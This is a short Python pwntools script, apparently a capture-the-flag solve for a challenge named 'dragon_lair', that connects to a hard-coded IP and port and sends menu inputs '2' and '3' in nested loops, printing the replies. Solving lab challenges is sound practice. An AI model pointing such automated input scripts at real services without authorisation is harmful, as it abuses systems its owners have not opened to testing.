from pwn import *
import time

p = remote("103.152.242.228", 2022)
# p = process("./dragon_lair")
for i in range(1000):
	p.sendline(b"2")
	for j in range(35):
		p.sendline(b"3")
	print(p.recv())
#	time.sleep(1)

print(p.recv())

